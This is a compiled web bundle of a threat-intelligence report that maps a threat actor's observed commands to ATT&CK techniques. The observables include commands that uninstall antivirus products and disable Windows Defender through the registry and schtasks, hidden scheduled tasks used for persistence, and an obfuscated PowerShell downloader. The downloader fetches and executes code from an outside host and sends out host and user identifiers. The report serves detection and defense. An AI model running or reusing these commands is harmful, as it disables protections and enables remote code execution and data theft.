",(0,l.kt)("em",{parentName:"h3"},"WMIC")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"h3"},"CMD")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1047",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple execution of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"td"},"WMIC"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Eset%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Kaspersky%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%avast%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Security%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%AntiVirus%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Norton Security%\\\'\\" call uninstall /nointeractive'))))),(0,l.kt)("h3",{id:"threat-actor-used-regexe-to-disable-windows-defender-policies-via-powershell-and-cmd-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Reg.exe")," to disable Windows Defender Policies via ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"h3"},"CMD")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run ",(0,l.kt)("em",{parentName:"td"},"Reg.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiVirus /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\" /v MpEnablePus /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SpynetReporting /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f'))))),(0,l.kt)("h3",{id:"threat-actor-used-schtasks-to-disable-windows-defender-scheduled-tasks-via-powershell-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"SCHTASKS")," to disable Windows Defender Scheduled Tasks via ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1053.005 - Scheduled Task/Job: Scheduled Task"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1053.005",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\" /Disable'))))),(0,l.kt)("h3",{id:"threat-actor-used-regexe-to-disable-windows-defender-policies-and-services-via-powershell-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to Disable Windows Defender Policies."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsDefender /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to Disable Windows Defender Services."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f'))))),(0,l.kt)("h3",{id:"threat-actor-used-schtasks-to-create-and-execute-scheduled-tasks-for-persistence"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"SCHTASKS")," to create and execute scheduled tasks for Persistence."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1053.005 - Scheduled Task/Job: Scheduled Task")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1053.005"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 120 /tn blackball1 /F /tr blackball1'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 120 /tn blackball /F /tr blackball'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 60 /tn \\\\lUWLs8e0z /F /tr \\"powershell -w hidden -c PS_CMD\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 60 /tn a2utp8I\\\\g4yeU6uwoY /F /tr \\"powershell -w hidden -c PS_CMD\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /run /tn a2utp8I\\\\g4yeU6uwoY'))))),(0,l.kt)("h3",{id:"threat-actor-used-a-highly-obfuscated-powershell-commands-for-command-and-control"},"Threat actor used a ",(0,l.kt)("em",{parentName:"h3"},"highly obfuscated PowerShell")," commands for Command And Control."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1027 - Obfuscated Files or Information"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns execution of ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," one-liner."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c powershell -w hidden -c function a($u)[REDACTED]"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1027",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," executes one-liner."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -w hidden -c function a($u){$d=(Ne"),"w-Obj",(0,l.kt)("inlineCode",{parentName:"td"},"ect Net.WebC"),'lient).\\"DownloadData\\"($u);$c=$d.count;if($c -gt 173){$b=$d',"[173..$c]",";$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=","[convert]","::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),","[convert]","::FromBase64String(-join([char[]]$d","[0..171]",")))){I",(0,l.kt)("inlineCode",{parentName:"td"},"ex(-join[char[]]$b)}}}$url='http://'+'t.zz3'+'r0.com';a($url+'/aa.jsp?ipc_20210405?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join'*'))"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The command is highly obfuscated.")))}k.isMDXComponent=!0}}]);